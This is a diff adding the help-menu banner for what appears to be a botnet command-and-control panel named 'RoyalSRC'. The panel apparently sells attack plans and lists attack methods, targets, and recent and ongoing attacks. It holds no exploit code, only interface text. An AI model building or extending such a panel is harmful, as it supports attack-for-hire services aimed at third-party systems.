@@ -1,0 +1,25 @@
+<<clear()>>
+<<full_screen_custom(78x30)>>
+
+[38;5;45m├── [38;5;255mAvailable Commands[38;5;045m:[38;5;255m[0m
+[38;5;45m├── [97mCLEAR[0m       [38;5;045m:[38;5;255m [38;5;255mClear the terminal.[0m
+[38;5;45m├── [97mCHAT[0m        [38;5;045m:[38;5;255m [38;5;255mAcces To SSH CHAT.[0m
+[38;5;45m├── [97mSHOP[0m        [38;5;045m:[38;5;255m [38;5;255mBuy a plan in a shop for <<$cnc>>.[0m
+[38;5;45m├── [97mINVEST[0m      [38;5;045m:[38;5;255m [38;5;255mView all cmd investisor for <<$cnc>>.
+[38;5;45m├── [97mHELP[0m        [38;5;045m:[38;5;255m [38;5;255mView this exact banner.[0m
+[38;5;45m├── [97mDOG[0m         [38;5;045m:[38;5;255m [38;5;255mAdd a dog. (if you send attack your dog send same).[0m
+[38;5;45m├── [97mMETHODS[0m     [38;5;045m:[38;5;255m [38;5;255mView the methods Page.[0m
+[38;5;45m├── [97mGAME[0m        [38;5;045m:[38;5;255m [38;5;255mView the game methods Page.[0m
+[38;5;45m├── [97mPLAN[0m        [38;5;045m:[38;5;255m [38;5;255mView your plan details.[0m
+[38;5;45m├── [97mGRAPH[0m       [38;5;045m:[38;5;255m [38;5;255mView a graph details.[0m
+[38;5;45m├── [97mLOOKUP[0m      [38;5;045m:[38;5;255m [38;5;255mLookup a target,mc, Cfx code.[0m
+[38;5;45m├── [97mRECENT[0m      [38;5;045m:[38;5;255m [38;5;255mView your last attacks.[0m
+[38;5;45m├── [97mMFA[0m         [38;5;045m:[38;5;255m [38;5;255mEnable Multi Factor Auth.[0m<<300()>>
+[38;5;45m├── [97mPASSWD[0m      [38;5;045m:[38;5;255m [38;5;255mChange your password on the RoyalSRC.[0m
+[38;5;45m├── [97mTHEMES[0m      [38;5;045m:[38;5;255m [38;5;255mChange the appearance of the RoyalSRC.[0m
+[38;5;45m├── [97mONGOING[0m     [38;5;045m:[38;5;255m [38;5;255mView ongoing attacks in the RoyalSRC.[0m
+[38;5;45m├── [97mC2[0m          [38;5;045m:[38;5;255m [38;5;255mView Other Commands.[0m
+[38;5;45m├── [97mCREDITS[0m     [38;5;045m:[38;5;255m [38;5;255mView credits for RoyalSRC.[0m
+[38;5;45m├── [97mCOMMANDS[0m    [38;5;045m:[38;5;255m [38;5;255mView Royal SRC commands.[0m
+[38;5;45m└── [97mCOMMANDS-LIST[0m[38;5;045m:[38;5;255m [38;5;255mView Royal SRC commands list.[0m
+
